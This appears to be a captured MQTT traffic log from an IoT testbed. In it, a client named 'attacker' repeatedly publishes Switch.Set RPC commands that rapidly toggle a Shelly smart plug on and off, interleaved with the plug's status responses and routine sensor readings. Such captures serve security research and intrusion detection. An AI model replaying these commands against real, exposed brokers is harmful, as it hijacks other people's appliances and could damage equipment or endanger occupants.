timestamp,topic,payload_size_bytes,payload_preview
2026-04-22T16:18:29,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:18:29,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:29,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:29,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3721 33242.409 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:29,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:18:29,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:18:29,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33242.41,""swi"
2026-04-22T16:18:29,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3722 33242.427 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:30,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:30,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:30,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3723 33242.910 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:30,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:30,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33242.91,""swi"
2026-04-22T16:18:30,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3724 33242.926 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:30,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:30,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:30,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3725 33243.413 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:30,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:18:30,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33243.41,""swi"
2026-04-22T16:18:30,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3726 33243.432 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:31,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:31,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:31,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3727 33243.922 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:31,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:31,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33243.92,""swi"
2026-04-22T16:18:31,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3728 33243.938 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:31,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:31,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:31,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3729 33244.423 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:31,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:18:31,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33244.42,""swi"
2026-04-22T16:18:31,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3730 33244.442 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:32,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:32,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:32,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3731 33244.922 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:32,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:32,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33244.92,""swi"
2026-04-22T16:18:32,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3732 33244.939 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:32,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:32,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:32,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3733 33245.423 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:32,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:18:32,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33245.42,""swi"
2026-04-22T16:18:32,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3734 33245.442 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:33,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:33,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:33,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3735 33245.923 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:33,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:33,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33245.92,""swi"
2026-04-22T16:18:33,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3736 33245.940 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:33,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:33,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:33,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3737 33246.423 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:33,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:18:33,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33246.42,""swi"
2026-04-22T16:18:33,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3738 33246.442 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:34,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:34,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:34,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3739 33246.924 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:34,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:34,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33246.92,""swi"
2026-04-22T16:18:34,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3740 33246.940 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:34,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:18:34,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:18:34,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:34,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:34,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3741 33247.424 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:34,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:18:34,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33247.42,""swi"
2026-04-22T16:18:34,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3742 33247.443 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:35,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:35,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:35,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3743 33247.924 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:35,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:35,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33247.92,""swi"
2026-04-22T16:18:35,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3744 33247.941 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:35,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:35,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:35,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3745 33248.431 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:35,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:18:35,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33248.43,""swi"
2026-04-22T16:18:35,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3746 33248.450 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:36,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:36,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:36,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3747 33248.928 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:36,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:36,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33248.93,""swi"
2026-04-22T16:18:36,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3748 33248.945 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:36,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:18:36,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:18:36,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:18:36,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:18:36,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:18:36,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:36,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:36,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3749 33249.427 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:36,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:18:36,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33249.42,""swi"
2026-04-22T16:18:36,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3750 33249.445 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:37,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:37,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:37,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3751 33249.927 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:37,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:37,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33249.92,""swi"
2026-04-22T16:18:37,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3752 33249.943 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:37,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:37,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:37,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3753 33250.427 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:37,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:18:37,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33250.42,""swi"
2026-04-22T16:18:37,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3754 33250.446 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:38,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:38,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:38,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3755 33250.927 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:38,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:38,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33250.92,""swi"
2026-04-22T16:18:38,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3756 33250.944 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:38,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:38,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:38,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3757 33251.428 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:38,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:18:38,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33251.42,""swi"
2026-04-22T16:18:38,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3758 33251.446 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:39,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:39,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:39,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3759 33251.930 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:39,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:39,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33251.93,""swi"
2026-04-22T16:18:39,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3760 33251.946 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:39,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:18:39,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:39,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:39,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:18:39,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3761 33252.429 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:39,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:18:39,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33252.43,""swi"
2026-04-22T16:18:39,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3762 33252.447 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:40,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:40,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:40,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3763 33252.963 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:40,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:40,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33252.96,""swi"
2026-04-22T16:18:40,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3764 33252.979 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:40,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:40,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:40,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3765 33253.437 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:40,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:18:40,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33253.43,""swi"
2026-04-22T16:18:40,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3766 33253.455 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:41,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:41,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:41,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3767 33253.930 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:41,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:41,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33253.93,""swi"
2026-04-22T16:18:41,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3768 33253.947 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:41,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
